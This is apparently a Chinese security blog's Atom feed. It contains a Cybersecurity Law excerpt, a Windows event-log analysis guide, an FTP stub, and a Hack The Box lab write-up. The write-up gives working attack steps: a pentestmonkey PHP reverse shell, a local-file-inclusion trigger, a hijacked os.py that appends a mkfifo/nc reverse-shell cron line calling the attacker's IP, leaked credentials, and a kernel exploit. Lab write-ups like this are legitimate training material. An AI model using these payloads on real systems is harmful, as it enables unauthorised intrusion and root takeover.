<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C</title>
  
  <subtitle>Cの博客</subtitle>
  <link href="https://github.com/chenchanghui/chenchanghui.github.io/atom.xml" rel="self"/>
  
  <link href="https://github.com/chenchanghui/chenchanghui.github.io/"/>
  <updated>2021-11-17T04:24:35.924Z</updated>
  <id>https://github.com/chenchanghui/chenchanghui.github.io/</id>
  
  <author>
    <name>C</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>中国网络安全法</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/491de8e6.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/491de8e6.html</id>
    <published>2021-11-17T04:08:15.000Z</published>
    <updated>2021-11-17T04:24:35.924Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><h2 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h2><h4 id="中华人民共和国网络安全法-1"><a href="#中华人民共和国网络安全法-1" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h4><ul><li>《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。</li><li>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员第二十四次会议于2016年11月7日通过，自2017年6月1日起施行。</li></ul><h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章 总则"></a>第一章 总则</h2><ul><li>第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</li><li>第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</li><li>第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，立健全网络安全保障体系，提高网络安全保护能立。</li><li>第四条 国家指定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</li><li>第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩戒网络违法犯罪活动，维护网络空间安全和秩序</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="网络安全法" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>htb</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/3bc9f39e.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/3bc9f39e.html</id>
    <published>2021-11-13T06:55:10.000Z</published>
    <updated>2021-11-18T10:28:26.122Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-friendzone"><a href="#0x01-friendzone" class="headerlink" title="0x01 friendzone"></a>0x01 friendzone</h2><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre class="line-numbers language-none"><code class="language-none">namp -sC -sV 10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IswvKe.png"></p><p>我们发现有ftp，但是不能匿名登录，DNS证书显示friendzone.red作为公共名称</p><p>访问10.10.10.123没有发现什么有效信息，访问443端口发现存在相应的域名访问，接下来利用dig搜索域名地址</p><pre class="line-numbers language-none"><code class="language-none">dig axfr friendzone.red @10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">域名信息administrator1.friendzone.red. 604800 IN A      127.0.0.1hr.friendzone.red.      604800  IN      A       127.0.0.1uploads.friendzone.red. 604800  IN      A       127.0.0.1friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改hosts文件将域名指向10.10.10.123才能正常访问127.0.0.1</p><p>windows下：C:\Windows\System32\drivers\etc\hosts    最好用notepad++打开用记事本比较麻烦</p><p>linux下：vim /etc/hosts</p><p>再次访问</p><p><a href="https://administrator1.friendzone.red/">https://administrator1.friendzone.red</a></p><p><img src="https://z3.ax1x.com/2021/11/13/Iss9OS.png"></p><p><a href="https://uploads.friendzone.red/">https://uploads.friendzone.red</a></p><p><img src="https://z3.ax1x.com/2021/11/13/IsyPc6.png"></p><p>存在上传点</p><p>上传一个123.txt试试</p><p><img src="https://z3.ax1x.com/2021/11/13/IsyWgx.png"></p><p>上传成功，但是找不到上传路径 </p><p>扫描smb共享共享文件信息</p><pre class="line-numbers language-none"><code class="language-none">enum4linux 10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/Isch7D.png"></p><p>发现存在print$、Files、general、Development、IPC$，但是只有general和Development可以登录</p><p>登录general</p><p><img src="https://z3.ax1x.com/2021/11/13/Is2oQI.png"></p><p>并且creds.txt可以下载下来</p><pre class="line-numbers language-none"><code class="language-none">$ cat creds.txtcreds for the admin THING:admin:WORKWORKHhallelujah@#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以用于之前的登录页面</p><p><img src="https://z3.ax1x.com/2021/11/13/IsWeUS.png"></p><p>登录成功，提示visit /dashboard.php</p><p><img src="https://z3.ax1x.com/2021/11/13/Is72jg.png"></p><p>提示图形名称参数丢失</p><p>后面给出默认参数image_id=a.jpg&amp;pagename=timestamp，我们输出查看</p><p><img src="https://z3.ax1x.com/2021/11/13/IsH5se.png"></p><p>返回了一个timestamp时间戳</p><p>登录Development</p><p><img src="https://z3.ax1x.com/2021/11/13/IsRDAS.png"></p><p>能上传文件</p><p>前面smb共享信息搜集发信file文件在夹是路径/etc/Files，下面的Development用过也是/etc/Development，可以上传shell</p><p>下载phpshell</p><pre class="line-numbers language-none"><code class="language-none">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php代理下载 proxychains4 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>要修改ip和port变量，ip改为openvpn的ip，ifconfig tun0 查看</p><p>上传成功</p><p><img src="https://z3.ax1x.com/2021/11/13/Is4yV0.png"></p><p>扫一下<a href="https://administrator1.friendzone.red/%E8%B7%AF%E5%BE%84">https://administrator1.friendzone.red/路径</a></p><pre class="line-numbers language-none"><code class="language-none">gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red -k -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">扫出的路径/images/login.php/dashboard.php/timestamp.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试timestamp.php</p><p><img src="https://z3.ax1x.com/2021/11/13/Is7epT.png"></p><p>返回的是timestamp时间戳</p><p>这与前面返回的timestamp一样，可能存在文件包含</p><p>尝试将pagename值改为上传的shell路径/etc/Development/php-reverse-shell.php，终端打开监听</p><p>访问（主机虚拟机访问都行）</p><pre class="line-numbers language-none"><code class="language-none">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/php-reverse-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监听成功</p><p><img src="https://z3.ax1x.com/2021/11/13/IsL8qe.png"></p><p>开启交互式</p><pre class="line-numbers language-none"><code class="language-none">python -c "import pty; pty.spawn('/bin/bash')"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传检测工具pspy64s、enumLinux.sh，通过Development上传，然后拷贝到/tmp目录下(一般执行文件房放在/tmp下没有那么多限制)</p><p><img src="https://z3.ax1x.com/2021/11/13/IsX2vV.png"></p><p>运行pspy64s</p><pre class="line-numbers language-none"><code class="language-none">./pspy64s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IsjC8I.png"></p><p>发现存在python程序，uid=0为root权限</p><p>查看内容</p><pre class="line-numbers language-none"><code class="language-none">cat /opt/server_admin/reporter.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IsvZy6.png"></p><p>调用了os</p><p>可以通过覆盖os.py得到root权限</p><p>os.py路径，存在</p><p><img src="https://z3.ax1x.com/2021/11/13/IsvR7F.png"></p><p>新建一个os.py反弹shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell <span class="token operator">=</span> <span class="token triple-quoted-string string">'''* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.32 4444 &gt;/tmp/f'''</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/crontab'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>覆盖原有os.py</p><pre class="line-numbers language-none"><code class="language-none">cp /etc/Development/os.py /usr/lib/python2.7/os.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看是否成功写入</p><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/Isz2i4.png"></p><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>待脚本运行后即可返回root权限shell    </p><h2 id="0x02-help"><a href="#0x02-help" class="headerlink" title="0x02 help"></a>0x02 help</h2><p>信息收集</p><pre class="line-numbers language-none"><code class="language-none">namp -sC -sV -p - 10.10.10.121<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/ITVPje.png" style="zoom:67%;"><p>访问80和3000端口</p><p><img src="https://z3.ax1x.com/2021/11/18/ITVagU.png"></p><p><img src="https://z3.ax1x.com/2021/11/18/ITVU3T.png"></p><p>3000端口返回的是json格式的数据</p><p>利用gobuster跑一下目录</p><img src="https://z3.ax1x.com/2021/11/18/ITZNdA.png" style="zoom:67%;"><p>访问support目录</p><p><img src="https://z3.ax1x.com/2021/11/18/ITZcZj.png"></p><p><img src="https://z3.ax1x.com/2021/11/18/ITQS6P.png"></p><p>发现第二个页面存在上传点</p><p>搜索一下helpdeskz的漏洞</p><pre class="line-numbers language-none"><code class="language-none">searchsploit helpdeskz或者通过https://www.exploit-db.com查找<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Exploit Title                                         |  Path------------------------------------------------------- ---------------------------------HelpDeskZ 1.0.2 - Arbitrary File Upload                | php/webapps/40300.pyHelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Un | php/webapps/41200.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们使用1.0.2版本的上传漏洞</p><p>表较稳定的poc</p><pre class="line-numbers language-none"><code class="language-none">https://raw.githubusercontent.com/sawinskii/HelpDeskZ-1.0.2-File-Uplaod/master/helpdeskz.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传shell用friendzone里的shell就行，ip变了的话改一下ip</p><img src="https://z3.ax1x.com/2021/11/18/IT1XY4.png" style="zoom:67%;"><p>显示File is not allowed，说明上传成功，这只是不被允许而已，开启nc监听，在上传后1min内执行POC就行</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 12346<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python helpdeskz.py http://10.10.10.121/support/uploads/tickets/ 111.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/IT3gj1.png" style="zoom: 80%;"><p>查看配置文件</p><pre class="line-numbers language-none"><code class="language-none">cd /var/www/html/support/includescat config.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/IT8sVf.png" style="zoom:80%;"><p>可以得到数据库用户密码root和helpme</p><p>接下来登录数据库</p><pre class="line-numbers language-none"><code class="language-none">mysql -u root -phelpme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/IT8vs1.png" style="zoom:80%;"><p>查看support数据库的表</p><pre class="line-numbers language-none"><code class="language-none">| articles               || attachments            || canned_response        || custom_fields          || departments            || emails                 || error_log              || file_types             || knowledgebase_category || login_attempt          || login_log              || news                   || pages                  || priority               || settings               || staff                  || tickets                || tickets_messages       || users           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看users表</p><pre class="line-numbers language-none"><code class="language-none">| id | salutation | fullname | email                 | password                                 | timezone         | status |+----+------------+----------+-----------------------+------------------------------------------+------------------+--------+|  1 |          0 | helpme   | helpme@helpme.com     | c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca | Indian/Christmas |      1 ||  2 |          0 | xcvxv    | lolololol@yopmail.com | ec09fa0d0ba74336ea7fe392869adb198242f15a | NULL             |      1 ||  3 |          0 | eee      | eee@eee.com           | f81124f4143a3f05d6495f1cda9348e2c3db03ab | NULL             |      1 |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到一些敏感信息，可以发现之前上传的eee。</p><p>查看staff表</p><pre class="line-numbers language-none"><code class="language-none">| id | username | password                                 | fullname      | email              | login      | last_login | department         | timezone | signature                    | newticket_notification | avatar | admin | status |+----+----------+------------------------------------------+---------------+--------------------+------------+------------+--------------------+----------+------------------------------+------------------------+--------+-------+--------+|  1 | admin    | d318f44739dced66793b1a603028133a76ae680e | Administrator | support@mysite.com | 1547216217 | 1543429746 | a:1:{i:0;s:1:"1";} |          | Best regards,Administrator |                      0 | NULL   |     1 | Enable |admin解密出为Welcome1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用得到的密码登录ssh</p><img src="https://z3.ax1x.com/2021/11/18/ITGhfe.png" style="zoom:80%;"><p>登录成功，help用户</p><p>查看内核</p><pre class="line-numbers language-none"><code class="language-none">uname -aLinux help 4.4.0-116-generic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查找漏洞</p><pre class="line-numbers language-none"><code class="language-none">searchsploit 4.4.0-116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/ITtme1.png" style="zoom:80%;"><p>将POC拷到当前目录</p><pre class="line-numbers language-none"><code class="language-none">cp /usr/share/exploitdb/exploits/linux/local/44298.c 111.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试scp上传</p><pre class="line-numbers language-none"><code class="language-none">scp 111.c help@10.10.10.121:/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传成功</p><img src="https://z3.ax1x.com/2021/11/18/ITt0fS.png" style="zoom:80%;"><p>编译</p><pre class="line-numbers language-none"><code class="language-none">gcc 111.c -o 1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加权限执行</p><pre class="line-numbers language-none"><code class="language-none">chmod +x 1111./1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="https://z3.ax1x.com/2021/11/18/ITto6J.png" style="zoom:80%;"><p>提取成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="靶场" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>filezilla搭建FTP服务器</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/3a5e82e1.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/3a5e82e1.html</id>
    <published>2021-10-27T15:39:02.000Z</published>
    <updated>2021-11-13T09:14:30.976Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p>下载地址：<a href="https://www.filezilla.cn/download">下载 - FileZilla中文网</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ftp服务器搭建" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Windows日志分析</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/604d6f82.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/604d6f82.html</id>
    <published>2021-10-22T04:37:25.000Z</published>
    <updated>2021-10-26T02:51:01.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><h2 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h2><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有一下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p>系统日志</p><pre class="line-numbers language-none"><code class="language-none">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的事件类型由Windows NT/2000操作系统预先定义。默认位置：%SystemRoot%\System32\Winevt\Logs\System.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>应用程序日志</p><pre class="line-numbers language-none"><code class="language-none">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序日志中找到相应的记录，也许会有助于解决问题。默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安全日志</p><pre class="line-numbers language-none"><code class="language-none">记录系统的安全审计事件，包含各类型的登录日志，对象访问日志，进程追踪日志、特权使用、账号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理元可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。默认位置：%SystemRoot%\System\Winevt\Logs\Security.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。安全日志记录事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p><h2 id="0x02-审核策略与事件查看器"><a href="#0x02-审核策略与事件查看器" class="headerlink" title="0x02 审核策略与事件查看器"></a>0x02 审核策略与事件查看器</h2><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启动，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p>设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 策略审核，参考配置操作：</p><p><img src="https://z3.ax1x.com/2021/10/22/5cn13Q.png"></p><p>设置2：设置合理的日志属性，即日志做大大小、事件覆盖阈值等：</p><p>win+R输入eventvwr.msc</p><p><img src="https://z3.ax1x.com/2021/10/22/5c13gU.png"></p><h2 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h2><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录</td></tr><tr><td>3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动</td></tr><tr><td>5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行</td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序</td></tr><tr><td>10</td><td>远程交互（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机</td></tr><tr><td>11</td><td>换粗交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到的“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><p>原文链接：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；</p></li><li><p>在事件查看器中，单击“安全”，查看安全日志；</p></li><li><p>在安全日志右侧操作中，单击“筛选当前日志”，输入事件ID进行筛选。</p><p>4624 - 登录成功</p><p>4625 - 登录失败</p><p>4634 - 注销成功</p><p>4647 - 用户启动的注销</p><p>4672 - 使用超级用户（用户管理员）</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数1725904，即用户登录失败了175904次，那么这台服务器管理元账号可能遭遇了暴力猜解。</p><p><img src="https://z3.ax1x.com/2021/10/25/54MYfs.png"></p><p>案例2：可以利用eventlog事件查看计算机开关机的记录：</p><ol><li>在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；</li><li>在事件查看器中，单击“系统”，查看系统日志；</li><li>在系统日志右侧操作中，单击“筛选当前日志”，输入事件ID进行筛选。</li></ol><p>其中事件ID 6006、ID 6005、ID 6009就表示不同状态的机器的情况（开关机）。</p><p><img src="https://z3.ax1x.com/2021/10/25/541jnx.png"></p><h2 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h2><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用SQL语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>使用实例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p>基本查询结构</p><pre class="line-numbers language-none"><code class="language-none">Logparser.exe -i:EVT -o:DATAGRID "SELECT * FROM c:\xx.evtx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>查询登录成功的事件</p><pre class="line-numbers language-none"><code class="language-none">登录成功的所有事件LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM c:\Security.evtx where EVentID=4624"指定登录时间范围的事件LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM c:\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and  EVentID=4624"提取登录成功的用户和IPLogParser.exe -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,ECTRACT_TOKEN(Strings,5,'|') as Username,EXTACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EVentID=4624"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>查询登录失败的事件</p><pre class="line-numbers language-none"><code class="language-none">登录失败的所有事件LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM c:\Security.evtx where EVentID=4625"提取登录失败用户名进行聚合统计LogParser.exe -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\Security.evtx where EVentID=4625 GROUP BY Message"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>系统历史开关机记录</p><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT -o:DATAGRID "SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EvnetID=6005 or EventID=6006"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="Logparser-Lizard"><a href="#Logparser-Lizard" class="headerlink" title="Logparser Lizard"></a>Logparser Lizard</h4><p>对于GUI环境的Log Parser Lizard，特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft.NET Framework 4.5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows的记录被记载的事件，其强大的过来功能可以快速的过滤出有价值的信息</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><img src="https://z3.ax1x.com/2021/10/26/55b7N9.png" style="zoom: 50%;"><p>参考链接：<a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入简单学习审计和分析</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/8076741c.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/8076741c.html</id>
